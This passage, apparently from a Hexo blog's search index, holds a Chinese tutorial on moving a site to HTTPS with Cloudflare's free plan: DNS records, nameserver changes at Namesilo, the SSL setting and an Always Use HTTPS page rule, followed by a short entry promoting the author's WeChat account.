email按钮，跳转到登陆界面，输入正确的账号密码后，才算是验证成功。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x02-添加配置网站"><a href="#0x02-添加配置网站" class="headerlink" title="0x02 添加配置网站"></a>0x02 添加配置网站</h1><p>回到Cloudflare页面，输入自己的域名<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>网页提示正在查询你的DNS记录，点击Next<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>这里我选择0元/月，也就是免费的，具体每个Plan是什么意思，可以看下面翻译后的图片，选择后之后，点击Confirm plan<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>弹出提示信息，问我们是否确认购买这个plan，我们直接确认，点击Confirm<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>将所有DNS记录删除，添加类型为A，Name为www，Value为你的IP地址，TTL为自动的一条记录后，点击Continue<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10">接下来需要修改你的域名服务器，这就需要到你购买域名的地方去修改了，我的域名是在namesilo购买的，因此这里以namesilo为例。<br>这里可以先把下图中红色框中的内容先复制下来。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-配置域名服务器"><a href="#0x03-配置域名服务器" class="headerlink" title="0x03 配置域名服务器"></a>0x03 配置域名服务器</h1><p>打开自己购买域名的地方，这里我打开的是namesilo官网，对于其他域名网站都类似，具体配置域名服务器的教程可以谷歌之。<br>进入官网登陆后，点击Manage My Domains<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>选择需要修改的域名后，点击Change Nameservers，namesilo默认有3个Nameservers，我这里之前已经修改过了，所以NameServers栏中会和默认的不一样。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>先将原来信息删除，将上面复制的内容逐一复制进去即可，点击SUBMIT，这里因为我已经修改过了，因此界面会显示不大一样。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https12.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>回到CloudFlasre页面，点击Continue，跳转到以下界面，稍等一段时间，来到namesilo查看配置进度<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https13.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>下面Status显示Active说明域名服务器就已经配置好了。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https14.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https15.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x04-配置SSL"><a href="#0x04-配置SSL" class="headerlink" title="0x04 配置SSL"></a>0x04 配置SSL</h1><p>来到Crypto，点击using SSl<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https16.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>点击Sign up<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https17.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>跳转到如下界面<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https18.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>等待一段时间，少则几十分钟一个小时，多则24小时，见到下面红色框内容出现，说明SSl配置就成功了<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https19.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>此时登陆我们的域名就可以看到高贵的安全锁标志了。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https20.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x05-设置Always-Use-HTTPS规则"><a href="#0x05-设置Always-Use-HTTPS规则" class="headerlink" title="0x05 设置Always Use HTTPS规则"></a>0x05 设置Always Use HTTPS规则</h1><p>虽然设置了http，但是发现输入域名还是会自动以http协议连接，因此我们来到Page Rules添加一下规则。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https21.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>第一个框填写自己的域名，接着选择Always Use HTTPS，点击Save and Deploy。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/https22.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"><br>同样需要等待一段时间，输入自己域名后就可以发现可以直接跳转到https了。</p><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>除此之外在宝塔上配置https也是很方便的，不过因为担心宝塔配置Web的过程中安装的LNMP什么的和本地一些已经安装好的环境发生冲突，最后还是没有继续选择使用宝塔，于是在网上查找了很多将http升级为https的方法，但基本都是用的国内的云，都有自带的证书服务，并不适用于我的情况，最后看到这篇文章：<a href="https://zhouhengheng.com/%E5%AE%9E%E7%8E%B0Hexo%E5%8D%9A%E5%AE%A2%E4%BB%8EHTTP%E5%88%B0HTTPS%E5%8A%A0%E5%AF%86.html">文章链接</a>，不过写的比较简陋，于是结合这篇文章以及自己的摸索，记录下这篇文章。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Https </tag>
            
            <tag> CloudFlare </tag>
            
            <tag> Namesilo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>欢迎关注我的个人微信公众号：TeamsSix</title>
      <link href="//171219-070707.html"/>
      <url>//171219-070707.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
